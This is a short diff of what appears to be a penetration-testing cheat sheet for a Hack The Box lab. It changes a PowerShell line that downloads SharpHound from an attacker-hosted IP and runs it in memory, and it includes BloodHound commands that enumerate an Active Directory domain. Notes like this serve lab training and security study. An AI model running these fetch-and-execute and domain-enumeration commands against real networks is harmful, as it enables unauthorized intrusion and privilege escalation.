@@ -525,7 +525,7 @@ IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/PrivescC
 ```powershell
 # Sharphound
 cd /usr/lib/bloodhound/resources/app/Collectors/
-IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/Sharphound.ps1')
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/SharpHound.ps1')
 Invoke-BloodHound -CollectionMethod All -Domain htb.local -DomainController 10.10.10.1 -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "Name"
 
 .\SharpHound.exe -c All -d htb.local --domainController 10.10.10.1 -o 
